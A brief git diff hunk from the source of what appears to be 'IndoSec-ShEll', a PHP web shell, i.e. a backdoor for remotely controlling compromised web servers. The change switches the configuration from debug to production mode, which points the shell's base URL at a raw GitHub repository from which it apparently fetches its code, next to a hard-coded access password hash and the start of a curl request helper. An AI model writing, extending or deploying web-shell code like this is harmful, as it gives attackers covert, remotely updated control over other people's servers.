@@ -58,7 +58,7 @@ if (@function_exists('ini_set')) {
 /* Configurasi */
 $aupas 					= "54062f3bf6377d42b4fab7c8fedfc7da"; // IndoSec
 $_SESSION["password"] 	= $aupas;
-$mode					= "debug";
+$mode					= "prod";
 $BASE_URL				= $mode === "prod" ? "https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main" : "http://localhost/www/percobaan/ids-shell";
 
 function curlRequest($url)
